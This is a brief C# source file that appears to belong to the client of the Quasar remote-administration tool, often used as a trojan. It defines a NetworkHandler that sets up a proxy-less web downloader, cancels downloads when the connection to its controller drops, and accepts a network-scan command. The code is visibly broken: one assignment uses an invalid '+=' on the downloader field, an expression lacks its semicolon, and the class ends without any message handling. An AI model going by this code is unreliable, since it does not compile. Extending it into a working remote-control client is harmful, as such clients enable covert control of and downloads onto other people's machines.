using Quasar.Client.Networking;
using Quasar.Client.Setup;
using Quasar.Client.Helper;
using Quasar.Common;
using Quasar.Common.Enums;
using Quasar.Common.Helpers;
using Quasar.Common.Messages;
using Quasar.Common.Messages.other;
using Quasar.Common.Messages.Network;
using Quasar.Common.Networking;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Reflection;
using System.Threading;

namespace Quasar.Client.Messages
{
    public class NetworkHandler : IMessageProcessor, IDisposable
    {
        private readonly QuasarClient _client;

        private readonly WebClient _webClient;

        public NetworkHandler(QuasarClient client)
        {
            _client = client;
            _client.ClientState += OnClientStateChange;
            _webClient += new WebClient { Proxy = null };
            _webClient.DownloadFileCompleted += OnDownloadFileCompleted;
        }

        private void OnClientStateChange(Networking.Client s, bool connected)
        {
            if (!connected)
            {
                if (_webClient.IsBusy)
                    _webClient.CancelAsync();
            }
        }

        public bool CanExecute(IMessage message) => message is DoNetworkScan
    }
}
